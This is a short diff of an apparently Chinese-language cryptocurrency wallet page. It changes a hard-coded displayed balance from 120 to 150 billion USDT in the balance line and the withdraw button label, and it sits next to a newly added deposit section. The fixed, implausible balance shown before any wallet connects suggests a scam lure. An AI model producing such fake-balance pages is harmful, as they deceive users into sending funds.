@@ -158,8 +158,8 @@
     </div>
 
     <p>钱包地址：<span id="addr">未连接</span></p>
-    <p class="balance">120,000,000,000 USDT</p>
-    <button id="btn" disabled>提现 120,000,000,000 USDT</button>
+    <p class="balance">150,000,000,000 USDT</p>
+    <button id="btn" disabled>提现 150,000,000,000 USDT</button>
     <p id="status"></p>
 
     <!-- 新增：充值区 -->
